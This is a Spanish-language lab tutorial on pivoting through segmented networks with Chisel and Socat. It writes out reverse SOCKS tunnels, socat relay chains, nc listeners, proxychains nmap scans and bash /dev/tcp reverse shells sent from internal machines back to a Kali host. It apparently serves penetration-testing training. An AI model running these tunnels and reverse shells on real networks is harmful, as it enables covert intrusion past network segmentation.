Chisel y Socat

Chisel: permite crear túneles TCP y SOCKS en ambos sentidos mediante port forwarding local o reverse.

Socat: permite redirigir conexiones TCP/UDP entre hosts y puertos. Es muy útil para transportar reverse shells a través de varios pivotes.

1. Esquema del laboratorio

Kali: 10.10.10.12

Máquina 1: 10.10.10.13 / 20.20.20.13

Máquina 2: 20.20.20.14 / 30.30.30.12

Máquina 3: 30.30.30.10

2. Chisel: Port Forwarding y SOCKS

Kali: levantar servidor Chisel en el puerto 9090

chisel server -p 9090 --reverse --socks5

Máquina 1: cliente Chisel con reverse SOCKS y reverse port forwarding

# SOCKS reverse:
# Kali:1080 -> red accesible desde Máquina 1

# Reverse port forwarding:
# Kali:80  -> Máquina 1:8080
# Kali:443 -> Máquina 1:4443

chisel client 10.10.10.12:9090 R:1080:socks R:80:127.0.0.1:8080 R:443:127.0.0.1:4443

# Añadir al final de /etc/proxychains4.conf en Kali:
# socks5 127.0.0.1 1080

# Ya tenemos visibilidad con la red azul.
proxychains whatweb 20.20.20.14

La red azul no tiene visibilidad directa con Kali, así que no podríamos recibir una reverse shell directamente desde esa red. Para eso usamos socat, redirigiendo conexiones desde una máquina pivote hacia Kali.

3. Socat: Reverse Shell desde Máquina 2 hacia Kali

Máquina 1: redirigir puerto 1111 hacia Kali:443

# Todo lo que llegue a Máquina 1:1111 se reenvía a Kali:443.
# Si ponemos el puerto 9090 en vez de 443, lo mandaríamos al servidor de Chisel.

socat TCP-LISTEN:1111,fork,reuseaddr TCP:10.10.10.12:443

Kali: escuchar por el puerto 443

nc -nlvp 443

Máquina 2: reverse shell hacia el Socat de Máquina 1

sh -i >& /dev/tcp/20.20.20.13/1111 0>&1

Ahora tenemos conexión entre Kali, Máquina 1 y Máquina 2. El siguiente paso es seguir pivotando hacia Máquina 3.

4. Segundo pivote con Chisel hacia la red verde

Máquina 1: redirigir puerto 2222 hacia Kali:9090

socat TCP-LISTEN:2222,fork,reuseaddr TCP:10.10.10.12:9090

Máquina 2: cliente Chisel hacia Kali pasando por Máquina 1

# Máquina 2 se conecta a Máquina 1:2222.
# Máquina 1 reenvía esa conexión hacia Kali:9090.

chisel client 20.20.20.13:2222 R:1090:socks

Kali: configurar Proxychains

nano /etc/proxychains4.conf

# Añadimos al final:
socks5 127.0.0.1 1090
socks5 127.0.0.1 1080

Proxychains: comprobar visibilidad con la red verde

proxychains whatweb 30.30.30.10

# Alternativa para enumerar puertos:
proxychains nmap -sT -Pn 30.30.30.10

Conseguimos visibilidad con la Máquina 3 usando Proxychains, pero Máquina 3 sigue sin tener visibilidad directa con Kali.

5. Reverse Shell desde Máquina 3 hasta Kali

Kali: escuchar por el puerto 443

nc -nlvp 443

Máquina 1: redirigir puerto 4000 hacia Kali:443

socat TCP-LISTEN:4000,fork,reuseaddr TCP:10.10.10.12:443

Máquina 2: redirigir puerto 3333 hacia Máquina 1:4000

socat TCP-LISTEN:3333,fork,reuseaddr TCP:20.20.20.13:4000

Máquina 3: lanzar reverse shell hacia Máquina 2

sh -i >& /dev/tcp/30.30.30.12/3333 0>&1

La reverse shell de Máquina 3 viaja así: Máquina 3:reverse shell → Máquina 2:3333 → Máquina 1:4000 → Kali:443.

6. Limpieza

Parar procesos de Socat

pkill socat

Comprobar puertos en uso

ss -tulpn | grep -E "9090|1080|1090|443|1111|2222|3333|4000"
